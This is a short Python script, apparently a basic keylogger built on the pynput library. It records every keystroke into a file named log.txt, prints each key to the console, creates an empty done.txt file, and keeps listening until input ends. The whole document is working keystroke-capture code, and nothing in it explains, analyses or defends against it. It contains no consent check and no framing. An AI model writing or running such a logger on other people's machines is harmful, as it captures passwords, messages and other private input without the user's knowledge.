from pynput import keyboard
import os

class KeyLogger():
    def __init__(self, filename: str = "log.txt") -> None:
        self.filename = filename

    @staticmethod
    def get_char(key):
        try:
            return key.char
        except AttributeError:
            return str(key)

    def on_press(self, key):
        print(key)
        with open(self.filename, 'a') as logs:
            logs.write(self.get_char(key))

    def main(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__':
    f= open("done.txt","w+")
    f.close()
    logger = KeyLogger()
    logger.main()
    input()
